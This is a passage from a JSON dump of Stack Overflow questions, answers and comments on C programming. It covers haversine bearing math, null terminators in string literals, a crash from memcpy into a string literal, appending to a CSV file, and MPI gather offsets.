"https://www.gravatar.com/avatar/db2d0375f301d26d08d5c6e9805abc84?s=128&d=identicon&r=PG&f=1", "display_name": "programer8472", "link": "https://stackoverflow.com/users/6030829/programer8472"}, "edited": false, "score": 0, "creation_date": 1459457550, "post_id": 36317555, "comment_id": 60308854, "body": "Thanks friends for all the input.  I will count my implementation as correct then, at least, correct enough for now. It sounds like a couple of you have some great thoughts on how the code could be optimized but, alas, I do not know how to incorporate the changes in my program. Never was terribly good at trig.  Happy Thursday everyone!"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 3, "user_id": 6030829, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/db2d0375f301d26d08d5c6e9805abc84?s=128&d=identicon&r=PG&f=1", "display_name": "programer8472", "link": "https://stackoverflow.com/users/6030829/programer8472"}, "edited": false, "score": 0, "creation_date": 1459459243, "post_id": 36317555, "comment_id": 60309748, "body": "@programer8472 Some minor improvements posted, not likely to make things much faster.  2 more ideas: <code>use float</code> and <code>float</code> functions <code>sinf()</code>, etc.  Post <i>working</i> code on <a href=\"http://codereview.stackexchange.com/questions/ask\">Code Review</a> and ask about <i>performance</i> considerations.  Only leave in <code>printf()</code> if that is part of the true code."}], "tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 3, "last_activity_date": 1459459062, "last_edit_date": 1495535308, "creation_date": 1459364757, "answer_id": 36317555, "question_id": 36317018, "link": "https://stackoverflow.com/questions/36317018/inaccurate-result-from-haversines-bearing-calculation/36317555#36317555", "title": "Inaccurate Result from Haversine&#39;s Bearing Calculation", "body": "<p>Not a problem.</p>\n\n<p>Consider 2 locations at the same latitude, yet differ in longitude.  One is not due east (90) of the other when going in the shorting great circle route.  Nor is the first due (west 270).  The bearings are not necessarily complementary.</p>\n\n<pre><code>FindDistance(34.0, -118.0, 34.0, -73.0);\nFindDistance(34.0, -73.0, 34.0, -118.0);\n\nDistance is 4113.598081\nBearing is 76.958824\nDistance is 4113.598081\nBearing is 283.041176\n</code></pre>\n\n<p><a href=\"https://stackoverflow.com/questions/36317018/inaccurate-result-from-haversines-bearing-calculation/36317555#comment60258163_36317018\">@user3386109</a> adds more good information.</p>\n\n<p>Per the <a href=\"http://www.movable-type.co.uk/scripts/latlong.html\" rel=\"nofollow noreferrer\">site</a> suggest by <a href=\"https://stackoverflow.com/questions/36317018/inaccurate-result-from-haversines-bearing-calculation/36317555#comment60258568_36317018\">@M Oehm</a> your code is about correct.</p>\n\n<hr>\n\n<p>Per OP request, some mods that may have slight speed improvement.</p>\n\n<pre><code>void FindDistance(double latHome, double lonHome, double latDest,\n    double lonDest) {\n  // A few extra digits sometimes is worth it - rare is adding more digits a problem\n  // double pi=3.141592653589793;\n  static const double pi_d180 = 3.1415926535897932384626433832795 / 180;\n  static const double d180_pi = 180 / 3.1415926535897932384626433832795;\n\n  // int R=6371; //Radius of the Earth in kilometers\n  // (Compiler may do this all ready)\n  static const double R = 6371.0; // better to make FP to avoid the need to convert \n\n  //Keep the parameters passed to the function immutable\n  double latHomeTmp = pi_d180 * (latHome);\n  double latDestTmp = pi_d180 * (latDest);\n  double differenceLon = pi_d180 * (lonDest - lonHome);\n  double differenceLat = pi_d180 * (latDest - latHome);\n\n  double a = sin(differenceLat / 2.) * sin(differenceLat / 2.)\n      + cos(latHomeTmp) * cos(latDestTmp) * sin(differenceLon / 2.)\n          * sin(differenceLon / 2.);\n\n  double c = 2 * atan2(sqrt(a), sqrt(1 - a));\n  double Distance = R * c;\n  printf(\"Distance is %f\\n\", Distance);\n\n  double RadBearing = atan2(sin(differenceLon) * cos(latDestTmp),\n      cos(latHomeTmp) * sin(latDestTmp)\n          - sin(latHomeTmp) * cos(latDestTmp) * cos(differenceLon));\n\n  // double DegBearing = RadBearing * 57.2958;\n  double DegBearing = RadBearing * d180_pi;\n\n  // Why is this even needed?\n  if (DegBearing &lt; 0) DegBearing = 360 + DegBearing;\n\n  printf(\"Bearing is %f\\n\", DegBearing);\n} //Function FindDistance\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 6030829, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/db2d0375f301d26d08d5c6e9805abc84?s=128&d=identicon&r=PG&f=1", "display_name": "programer8472", "link": "https://stackoverflow.com/users/6030829/programer8472"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 121, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1459459062, "creation_date": 1459362964, "last_edit_date": 1459450401, "question_id": 36317018, "link": "https://stackoverflow.com/questions/36317018/inaccurate-result-from-haversines-bearing-calculation", "title": "Inaccurate Result from Haversine&#39;s Bearing Calculation", "body": "<p>I am trying to implement the <a href=\"https://en.wikipedia.org/wiki/Versine#Haversine\" rel=\"nofollow\">Haversine</a> Formula in a little GPS program I'm writing. The distance calculations appear to be spot-on. However, I believe the bearing is being computed in radians, and I don't know how to properly convert the result to compass directions (0 for North, 90 for East, etc).</p>\n\n<p>Any help would be greatly appreciated, all this talk of cosigns and arctangents is giving me a major headache! I'm a coder, not a mathematician!</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\n\nvoid FindDistance (double latHome, double lonHome, double latDest, double lonDest)\n{\n    double pi=3.141592653589793;\n    int R=6371; //Radius of the Earth in kilometers\n    //Keep the parameters passed to the function immutable\n    double latHomeTmp=(pi/180)*(latHome);\n    double latDestTmp=(pi/180)*(latDest);\n    double differenceLon= (pi/180)*(lonDest- lonHome);\n    double differenceLat=(pi/180)*(latDest- latHome);\n    double a= sin (differenceLat/2.)*sin (differenceLat/2.)+cos   (latHomeTmp)*cos (latDestTmp)*sin (differenceLon/2.)*sin (differenceLon/2.);\n    double c=2*atan2 (sqrt (a), sqrt (1-a));\n    double Distance=R*c;\n    printf (\"Distance is %f\\n\", Distance);\n\n    double RadBearing=atan2 (sin (differenceLon)*cos (latDestTmp), cos   (latHomeTmp)*sin (latDestTmp)-sin (latHomeTmp)*cos (latDestTmp)*cos     (differenceLon));\n    double DegBearing=RadBearing*57.2958;\n    if (DegBearing&lt;0) DegBearing=360+DegBearing;\n    printf (\"Bearing is %f\\n\", DegBearing);\n} //Function FindDistance\n\nint main (void) {\n    puts (\"LA to NY\");\n    FindDistance (34.052235, -118.243683, 40.748817, -73.985428);\n    puts (\"NY to LA\");\n    FindDistance (40.748817, -73.985428, 34.052235, -118.243683);\n} //Function main\n\ngcc -o gps -lm gps.c\n</code></pre>\n\n<p>It returns a bearing of 65 from LA to NY, and a bearing of 273 from NY to LA.</p>\n\n<blockquote>\n  <p>If we add the bearings together, we get 338 which can't be right - shouldn't it equal 360?<br>\n  Or am I completely out to lunch?</p>\n</blockquote>\n\n<p>Anyway, as you can see, I always compute both distance and bearing at the same time. If you could also suggest a way to clean up the code so it doesn't perform unnecessary calculations, that would be so very outstanding! I'm running this on a small microprocessor where I like to make every cycle count!</p>\n"}, {"tags": ["c", "string"], "comments": [{"owner": {"reputation": 209335, "user_id": 661519, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1735ab1c8ba4229daa855ec6aad03065?s=128&d=identicon&r=PG", "display_name": "juanchopanza", "link": "https://stackoverflow.com/users/661519/juanchopanza"}, "edited": false, "score": 1, "creation_date": 1459362363, "post_id": 36316773, "comment_id": 60256920, "body": "You could easily check this with <code>sizeof</code>."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "reply_to_user": {"reputation": 209335, "user_id": 661519, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1735ab1c8ba4229daa855ec6aad03065?s=128&d=identicon&r=PG", "display_name": "juanchopanza", "link": "https://stackoverflow.com/users/661519/juanchopanza"}, "edited": false, "score": 1, "creation_date": 1459362713, "post_id": 36316773, "comment_id": 60257204, "body": "@juanchopanza never let an obvious and simple test get in the way of an SO post:("}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459362770, "post_id": 36316773, "comment_id": 60257247, "body": "<a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.4.5p6\" rel=\"nofollow noreferrer\">port70.net/~nsz/c/c11/n1570.html#6.4.5p6</a>"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 209335, "user_id": 661519, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1735ab1c8ba4229daa855ec6aad03065?s=128&d=identicon&r=PG", "display_name": "juanchopanza", "link": "https://stackoverflow.com/users/661519/juanchopanza"}, "edited": false, "score": 2, "creation_date": 1459362842, "post_id": 36316773, "comment_id": 60257297, "body": "@juanchopanza: It could still be implementation-specific left to the compiler. But reading the standard (aka &quot;RTFM&quot;) as always helps."}], "answers": [{"comments": [{"owner": {"reputation": 310760, "user_id": 12711, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c330bdee507c95c603a93ca91d9145a9?s=128&d=identicon&r=PG", "display_name": "Michael Burr", "link": "https://stackoverflow.com/users/12711/michael-burr"}, "edited": false, "score": 0, "creation_date": 1459362756, "post_id": 36316796, "comment_id": 60257237, "body": "The one exception is in C (but not C++) if you give the exact size of the array to match:  <code>char word[7] = &quot;Hello!\\0&quot;;</code>"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459362955, "post_id": 36316796, "comment_id": 60257369, "body": "There are non &quot;NULL&quot; bytes. Please don&#39;t use the name of the <code>NULL</code> macro for integers. It is a <i>null <b>pointer</b> constant</i>. A null character is either just the integer constant <code>0</code> or <code>NUL</code> resp. <code>nul</code> (the latter is less prone to be confused with <code>NULL</code>)."}], "tags": [], "owner": {"reputation": 4418, "user_id": 5264388, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/160f1b756f3f4a0ba9a2a58f4cce911b?s=128&d=identicon&r=PG", "display_name": "owacoder", "link": "https://stackoverflow.com/users/5264388/owacoder"}, "is_accepted": false, "score": 5, "last_activity_date": 1459363023, "last_edit_date": 1459363023, "creation_date": 1459362368, "answer_id": 36316796, "question_id": 36316773, "link": "https://stackoverflow.com/questions/36316773/does-c-omit-the-placement-of-the-null-character-in-a-string-constant-if-i-explic/36316796#36316796", "title": "Does C omit the placement of the null character in a string constant if i explicitly place it for myself, or will it still add it?", "body": "<p>The string literal always appends a nul (<code>'\\0'</code>) byte unless you specified the size of the array, so you will have two nul bytes in the string <code>\"Hello!\\0\"</code>. If you wrote <code>char word[7] = \"Hello!\\0\"</code> you would only have one nul byte in the array, since the size is now restricted to seven characters.</p>\n"}, {"tags": [], "owner": {"reputation": 77, "user_id": 5521543, "user_type": "registered", "profile_image": "https://graph.facebook.com/10204658594895407/picture?type=large", "display_name": "Hajras El Gdiry HG", "link": "https://stackoverflow.com/users/5521543/hajras-el-gdiry-hg"}, "is_accepted": false, "score": 0, "last_activity_date": 1459363580, "creation_date": 1459363580, "answer_id": 36317225, "question_id": 36316773, "link": "https://stackoverflow.com/questions/36316773/does-c-omit-the-placement-of-the-null-character-in-a-string-constant-if-i-explic/36317225#36317225", "title": "Does C omit the placement of the null character in a string constant if i explicitly place it for myself, or will it still add it?", "body": "<p>it will add a terminator automaticly however when you want to print the word or use any function that stop when it detict \\0 it will stop there .</p>\n\n<p>example : string x = \"loop007\" ; if you print it the result would be the same loop007 </p>\n\n<p>however string x = \"loo\\0p007\" will only print \"loo\"  since the compiler has found the terminator even though it is not the right on .</p>\n\n<p>long story short , yes it adds it eventhough you have assigned one allready .</p>\n"}, {"tags": [], "owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "is_accepted": false, "score": 1, "last_activity_date": 1459368575, "last_edit_date": 1459368575, "creation_date": 1459363634, "answer_id": 36317246, "question_id": 36316773, "link": "https://stackoverflow.com/questions/36316773/does-c-omit-the-placement-of-the-null-character-in-a-string-constant-if-i-explic/36317246#36317246", "title": "Does C omit the placement of the null character in a string constant if i explicitly place it for myself, or will it still add it?", "body": "<p>According to the C Standard (6.4.5 String literals)</p>\n\n<blockquote>\n  <p>6 In translation phase 7, <strong>a byte or code of value zero is appended\n  to each multibyte character sequence that results from a string\n  literal</strong> or literals.78) The multibyte character sequence is then\n  used to initialize an array of static storage duration and length just\n  sufficient to contain the sequence. For character string literals, the\n  array elements have type char, and are initialized with the individual\n  bytes of the multibyte character sequence....</p>\n</blockquote>\n\n<p>And (6.7.9 Initialization)</p>\n\n<blockquote>\n  <p>14 An array of character type may be initialized by a character string\n  literal or UTF\u22128 string literal, optionally enclosed in braces.\n  Successive bytes of the string literal (<strong>including the terminating\n  null character if there is room or if the array is of unknown size</strong>)\n  initialize the elements of the array.</p>\n</blockquote>\n\n<p>You can check it yourself running the following code snippet</p>\n\n<pre><code>char word[] = \"Hello!\\0\";\nprintf( \"%zu\\n\", sizeof( word ) );\n</code></pre>\n\n<p>The output will be equal to <code>8</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 0, "last_activity_date": 1459369584, "last_edit_date": 1459369584, "creation_date": 1459369258, "answer_id": 36318949, "question_id": 36316773, "link": "https://stackoverflow.com/questions/36316773/does-c-omit-the-placement-of-the-null-character-in-a-string-constant-if-i-explic/36318949#36318949", "title": "Does C omit the placement of the null character in a string constant if i explicitly place it for myself, or will it still add it?", "body": "<blockquote>\n  <p>Will the <code>word</code> array have one or two terminating null characters?</p>\n</blockquote>\n\n<pre><code>char word[] = \"Hello!\\0\"\n</code></pre>\n\n<p>The <em>array</em> will have 2 <strike>terminating</strike> null characters and a size of 8.<br>\nThe <em>string</em> located at the start of <code>word[]</code> will have 1 <em>terminating</em> null character.  The <code>'\\0'</code> after the <em>string</em> is not part of that <em>string</em>.</p>\n\n<hr>\n\n<p>In C, <em>string literals</em> may contain many <code>'\\0'</code>s.  The size of the string literal includes the coded characters and an appended null character: <code>'\\0'</code>,</p>\n\n<pre><code>printf(\"%zu\\n\", sizeof(\"Hello!\\0Hello!\\0Hello!\\0Hello!\\0\"));\nprintf( \"%zu\\n\", sizeof(\"Hello!\\0\" \"Hello!\\0\" \"Hello!\\0\" \"Hello!\\0\"));\n// both output 4*7+1 = 29\n</code></pre>\n\n<p>When initializing an character array with an unspecified length, the array size matches the size of the <em>string literal</em>.  </p>\n\n<pre><code>char word[] = \"Hello!\\0Hello!\\0Hello!\\0Hello!\\0\"\nprintf(\"%zu\\n\", sizeof word);\n// output 4*7+1 = 29\n</code></pre>\n\n<p>When printing a <em>string</em> (note this is not the same as <em>string literal</em>), printing continues up to, but not including the first encountered <code>'\\0'</code>.</p>\n\n<pre><code>printf(\"[%s]\\n\", word);\n// output [Hello!]\n</code></pre>\n\n<hr>\n\n<p>Pedantic detail:  <code>char word[] = \"Hello!\\0\"</code> contains a <em>string literal</em>, not <em>string consonant</em>. </p>\n"}], "owner": {"reputation": 51, "user_id": 5511402, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/6Xmzf.jpg?s=128&g=1", "display_name": "Andr&#233;s", "link": "https://stackoverflow.com/users/5511402/andr%c3%a9s"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 90, "favorite_count": 0, "answer_count": 4, "score": -1, "last_activity_date": 1459426812, "creation_date": 1459362282, "question_id": 36316773, "link": "https://stackoverflow.com/questions/36316773/does-c-omit-the-placement-of-the-null-character-in-a-string-constant-if-i-explic", "title": "Does C omit the placement of the null character in a string constant if i explicitly place it for myself, or will it still add it?", "body": "<p>Suppose you have this code:</p>\n\n<pre><code>char word[] = \"Hello!\\0\"\n</code></pre>\n\n<p>Will the <code>word</code> array have one or two terminating null characters?</p>\n"}, {"tags": ["c", "debugging", "crash", "runtime-error", "memcpy"], "comments": [{"owner": {"reputation": 310760, "user_id": 12711, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c330bdee507c95c603a93ca91d9145a9?s=128&d=identicon&r=PG", "display_name": "Michael Burr", "link": "https://stackoverflow.com/users/12711/michael-burr"}, "edited": false, "score": 2, "creation_date": 1459362465, "post_id": 36316765, "comment_id": 60257002, "body": "<code>p2</code> is pointing into a literal string which is memory that cannot be modified.  So <code>memcpy(p2,tmp,13)</code> is undefined behavior.  See <a href=\"http://stackoverflow.com/q/164194/12711\">stackoverflow.com/q/164194/12711</a>"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1459362749, "post_id": 36316765, "comment_id": 60257234, "body": "Even if it were legal, copying 13 bytes to <code>p1+2;</code> write beyonds its bounds."}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 1, "creation_date": 1459362759, "post_id": 36316765, "comment_id": 60257238, "body": "String constants are often placed in protected memory.  You cannot attempt to modify them, as this code does."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1459362779, "post_id": 36316765, "comment_id": 60257257, "body": "It&#39;s crashing because of multiple, serious bugs."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1459363103, "post_id": 36316765, "comment_id": 60257477, "body": "Start with <code>char p1[200] = &quot;ankitagrawal&quot;;</code>"}, {"owner": {"reputation": 976, "user_id": 6105692, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b319f39af45a42f5f38962b6869c335?s=128&d=identicon&r=PG&f=1", "display_name": "foo", "link": "https://stackoverflow.com/users/6105692/foo"}, "edited": false, "score": 0, "creation_date": 1459364686, "post_id": 36316765, "comment_id": 60258458, "body": "You also forgot to free the allocated memory for <code>tmp</code>."}], "answers": [{"tags": [], "owner": {"reputation": 137, "user_id": 4983155, "user_type": "registered", "accept_rate": 56, "profile_image": "https://lh6.googleusercontent.com/-Jn4zByOMdjc/AAAAAAAAAAI/AAAAAAAAB2Q/ra2ySY0yfHU/photo.jpg?sz=128", "display_name": "Ahmed F. Mostafa", "link": "https://stackoverflow.com/users/4983155/ahmed-f-mostafa"}, "is_accepted": false, "score": 0, "last_activity_date": 1459427629, "creation_date": 1459427629, "answer_id": 36333643, "question_id": 36316765, "link": "https://stackoverflow.com/questions/36316765/why-this-c-code-is-crashing/36333643#36333643", "title": "why this C code is crashing", "body": "<p>By using p2=p1+2 and then trying to memcpy 13 bytes from p2 will go 2 bytes byeond the memory allocated for p2 , which will surely generate fault.</p>\n\n<p>consider below code :</p>\n\n<pre><code>    char *p1, *p2, *p3, *p4;\n    p1 = \"ankitagrawal\";\n    p2= (char *)malloc(14);\n    memcpy(p2, p1 + 2, 14);\n    printf(\"\\np2 = %s\", p2);\n    char *tmp = (char*)malloc(14);\n    memcpy(tmp, p1, 14);\n    memcpy(p2, tmp, 14);\n    printf(\"p1 = %s \\np2= %s \\ntmp = %s\", p1, p2, tmp);\n</code></pre>\n"}], "owner": {"reputation": 17, "user_id": 5027866, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-qcKDdHL7nqg/AAAAAAAAAAI/AAAAAAAAAY0/eQPDY91d3uk/photo.jpg?sz=128", "display_name": "ankit agrawal", "link": "https://stackoverflow.com/users/5027866/ankit-agrawal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 58, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1459427629, "creation_date": 1459362267, "question_id": 36316765, "link": "https://stackoverflow.com/questions/36316765/why-this-c-code-is-crashing", "title": "why this C code is crashing", "body": "<pre><code>#include &lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\nvoid *mymemmove(const char *str1,const char* str2,int n)\n{\n    char *tmp = (char*)malloc(sizeof(char)*n);\n    memcpy(tmp,str2,n);\n    memcpy(str1,tmp,n);\n    free(tmp);\n    return NULL;\n}\n\nint main(void) {\n    // your code goes here\n    char *p1,*p2,*p3,*p4;\n    //p1= (char *)malloc(sizeof(char)*30);\n    p1=\"ankitagrawal\";\n    p2=p1+2;\n    char *tmp = (char*)malloc(sizeof(char)*13);\n    memcpy(tmp,p1,13);\n    memcpy(p2,tmp,13);\n    printf(\"p1 = %s /n p2= %s tmp =%s\",p1,p2,tmp);\n    //mymemmove(p2,p1,13);\n    //printf(\"p1 = %s /n p2= %s\",p1,p2);\n    return 0;\n}\n</code></pre>\n\n<p>My code is crashing in the second memcpy in the main function . can anyone please tell me what is the problem with the code ?</p>\n"}, {"tags": ["c", "csv", "iteration"], "comments": [{"owner": {"reputation": 1961, "user_id": 2275672, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/Kn6X7.jpg?s=128&g=1", "display_name": "Alfredo Gimenez", "link": "https://stackoverflow.com/users/2275672/alfredo-gimenez"}, "edited": false, "score": 0, "creation_date": 1459362492, "post_id": 36316673, "comment_id": 60257019, "body": "Store the results in a char buffer first, then after 1000 iterations write the entire buffer to the CSV file."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1459363569, "post_id": 36316673, "comment_id": 60257756, "body": "Perhaps <code>fopen(&quot;cellAvgValue.csv&quot;, &quot;a&quot;)</code> is what you&#39;re looking for. The <code>&quot;a&quot;</code> means <i>append</i>."}, {"owner": {"reputation": 16996, "user_id": 1317018, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/96f222df59ebb527ebaa9cb9105a5138?s=128&d=identicon&r=PG&f=1", "display_name": "Mahesha999", "link": "https://stackoverflow.com/users/1317018/mahesha999"}, "edited": false, "score": 0, "creation_date": 1459365181, "post_id": 36316673, "comment_id": 60258766, "body": "<a href=\"http://codingstreet.com/create-csv-file-in-c/#\" rel=\"nofollow noreferrer\">this</a> might help. And also answer of Jon Watte on <a href=\"https://social.msdn.microsoft.com/Forums/vstudio/en-US/6a12570b-df26-4736-9f32-60c8b0ccc281/how-to-write-into-a-csv-file-in-c?forum=vcgeneral\" rel=\"nofollow noreferrer\">this thread</a>."}, {"owner": {"reputation": 16996, "user_id": 1317018, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/96f222df59ebb527ebaa9cb9105a5138?s=128&d=identicon&r=PG&f=1", "display_name": "Mahesha999", "link": "https://stackoverflow.com/users/1317018/mahesha999"}, "reply_to_user": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1459365808, "post_id": 36316673, "comment_id": 60259141, "body": "@user3386109 seems to have pinpointed it. But if u r still in search of some solid reference then docs of <code>fopen</code> will help a lot. You can find good doc on <a href=\"https://msdn.microsoft.com/en-us/library/yeby3zcb.aspx?f=255&amp;MSPPError=-2147217396\" rel=\"nofollow noreferrer\">msdn</a> with examples. Or on <a href=\"http://man7.org/linux/man-pages/man3/fopen.3.html\" rel=\"nofollow noreferrer\">man page</a>. Or on <a href=\"http://www.gnu.org/software/libc/manual/html_node/Opening-Streams.html\" rel=\"nofollow noreferrer\">gnu page</a>"}], "owner": {"reputation": 19, "user_id": 6066037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/07be80b4690bd713201dd72ac26b9915?s=128&d=identicon&r=PG&f=1", "display_name": "Vishal Jadhav", "link": "https://stackoverflow.com/users/6066037/vishal-jadhav"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 54, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1459362829, "creation_date": 1459361984, "last_edit_date": 1459362829, "question_id": 36316673, "link": "https://stackoverflow.com/questions/36316673/how-to-apend-the-csv-file-after-each-iteration-in-c", "title": "How to apend the csv file after each iteration in C", "body": "<p>I am writing certain set of variables in CSV file after 10000 iteration. I want to write the file for intermediate iterations say after every 1000 iterations. How can I write the CSV file in C.</p>\n\n<pre><code>no_of_iteration=1000;\nfor ( n=0;n&lt;no_of_iteration;n++){\n//Perform operation on HorVel,VerVel,Pressure\n}\n\nfpCellAvgVal = fopen(\"cellAvgValue.csv\", \"w\"); // Change to match your path\n\nfor(n = 1; n &lt; jMax; n++){\n    for(m = 1; m &lt; iMax; m++)\n        fprintf(fpCellAvgVal, \"%lf,%lf ,%lf \\n\", Pressure[m][n], HorVel[m][n],VerVel[m][n]);\n}\n\nfclose(fpCellAvgVal);\n</code></pre>\n\n<p>How to write the data after every 1000 iterations in the same file?</p>\n"}, {"tags": ["c", "mpi"], "answers": [{"tags": [], "owner": {"reputation": 20828, "user_id": 620382, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/bf285996e4e7188feac84786a47d9f3a?s=128&d=identicon&r=PG", "display_name": "Zulan", "link": "https://stackoverflow.com/users/620382/zulan"}, "is_accepted": true, "score": 1, "last_activity_date": 1459365881, "last_edit_date": 1495535648, "creation_date": 1459365881, "answer_id": 36317897, "question_id": 36315949, "link": "https://stackoverflow.com/questions/36315949/mpi-vector-multiplication/36317897#36317897", "title": "MPI Vector multiplication", "body": "<p>Looking at your data layout I think you misunderstand data structures in MPI: All data is kept separate in each rank, there is no implict sharing or distribution. Your vector <code>partial_sum</code> is separate on each rank, each with the full 10 elements. So assuming <code>size=2</code>, <code>a_r=10</code> and zero initialization, after the computation the contents will look like this:</p>\n\n<ul>\n<li>rank 0: <code>{x0,x1,x2,x3,x4,0,0,0,0,0}</code></li>\n<li>rank 1: <code>{0,0,0,0,0,x5,x6,x7,x8,x9}</code></li>\n</ul>\n\n<p>Where x is the correct computed value. Gather will then collect the first <code>local_row=5</code> elements from each rank, resulting in <code>{x0,x1,x2,x3,x4,0,0,0,0,0}</code>.</p>\n\n<p>You <em>could</em> just fix this by adding the correct offset:</p>\n\n<pre><code>MPI_Gather(&amp;partial_mul[my_first_ele], local_row, MPI_INT, mul, local_row, MPI_INT, 0, MPI_COMM_WORLD);\n</code></pre>\n\n<p>But please don't do that. Instead you should reconsider your data structures to really distribute the data, reserve the correct sizes for each part of the vector / array. To send around parts of the data to each rank, use <code>MPI_Scatter</code> (the opposite of <code>MPI_Gather</code>). The most difficult is to get the matrix right. This is explained in detail by <a href=\"https://stackoverflow.com/a/9271753/620382\">this excellent answer</a>.</p>\n"}], "owner": {"reputation": 29, "user_id": 1984126, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b521befdc98e853be8da75e1804777?s=128&d=identicon&r=PG", "display_name": "priya", "link": "https://stackoverflow.com/users/1984126/priya"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 796, "favorite_count": 0, "accepted_answer_id": 36317897, "answer_count": 1, "score": 0, "last_activity_date": 1459365909, "creation_date": 1459359673, "last_edit_date": 1459365909, "question_id": 36315949, "link": "https://stackoverflow.com/questions/36315949/mpi-vector-multiplication", "title": "MPI Vector multiplication", "body": "<pre><code>#include&lt;stdio.h&gt;\n#include&lt;mpi.h&gt;\n\nint main()\n{\n        int a_r = 0, a_c = 0, v_s = 0, i = 0, rank = 0, size = 0;\n        int local_row = 0, partial_sum = 0, 